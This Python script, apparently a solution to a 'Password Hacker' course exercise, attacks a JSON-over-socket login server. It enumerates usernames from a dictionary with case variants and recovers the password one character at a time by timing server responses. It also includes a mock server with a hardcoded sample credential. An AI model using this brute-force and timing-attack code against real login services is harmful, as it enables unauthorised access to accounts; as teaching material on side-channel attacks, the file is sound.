from socket import socket
from sys import argv
from itertools import product
from string import ascii_letters, digits
from json import dumps, loads
from datetime import datetime
from time import sleep


def timer(func):
    def wrapper(*args):
        start = datetime.now()
        result = func(*args)
        finish = datetime.now()
        return result, (finish - start).microseconds
    return wrapper


def brute_force(n, prefix=""):
    for i in range(n):
        for guess in product(ascii_letters + digits, repeat=i + 1):
            yield prefix + "".join(guess)


def dictionary_based_brute_force(file_path, filename):
    with open(file_path + filename, "r") as file:
        for line in file:
            line = line.strip()
            if line != line.swapcase():
                for guess in product(*[(c, c.swapcase()) for c in line]):
                    yield "".join(guess)
            else:
                yield line


@timer
def send_receive(socket_, login, password=" "):
    socket_.send(dumps({"login": login, "password": password}, indent=4).encode())
    return loads(socket_.recv(1024).decode())["result"]


def crack(hostname, port):
    global path
    iter_login = dictionary_based_brute_force(path, "logins.txt")
    with socket() as client:
        client.connect((hostname, port))
        while True:
            guess_login = next(iter_login)
            if send_receive(client, guess_login)[0] == "Wrong password!":
                iter_pass = brute_force(1)
                while True:
                    guess_pass = next(iter_pass)
                    response = send_receive(client, guess_login, guess_pass)
                    if response[0] == "Connection success!":
                        return guess_login, guess_pass
                    elif response[1] > 2000:
                        iter_pass = brute_force(1, guess_pass)


@timer
def send_receive_offline(login, password=""):
    return loads(server_msg_offline(dumps({"login": login, "password": password}, indent=4)))["result"]


def server_msg_offline(guess):
    login = "SuperAdmin"
    password = "iDgT9tq1PU0"
    if loads(guess)["login"] != login:
        return dumps({"result": "Wrong login!"}, indent=4)
    elif loads(guess)["login"] == login and loads(guess)["password"] == password:
        return dumps({"result": "Connection success!"}, indent=4)
    elif loads(guess)["login"] == login and loads(guess)["password"] and loads(guess)["password"][-1] == password[len(loads(guess)["password"]) - 1]:
        print("sleep")
        sleep(3)
        return dumps({"result": "Wrong password!"}, indent=4)
    elif loads(guess)["login"] == login and loads(guess)["password"] != password:
        return dumps({"result": "Wrong password!"}, indent=4)


def crack_offline():
    global path
    iter_login = dictionary_based_brute_force(path, "logins.txt")
    while True:
        guess_login = next(iter_login)
        if send_receive_offline(guess_login)[0] == "Wrong password!":
            iter_pass = brute_force(1)
            while True:
                guess_pass = next(iter_pass)
                response = send_receive_offline(guess_login, guess_pass)
                print(guess_pass, response[1])
                if response[0] == "Connection success!":
                    return guess_login, guess_pass
                elif response[1] > 2000:
                    iter_pass = brute_force(1, guess_pass)


path = "C:/Users/almighty.patapon/PycharmProjects/Password Hacker/Password Hacker/task/hacking/"

log_, pass_ = crack(argv[1], int(argv[2]))
# log_, pass_ = crack_offline()
print(dumps({"login": log_, "password": pass_}, indent=4))
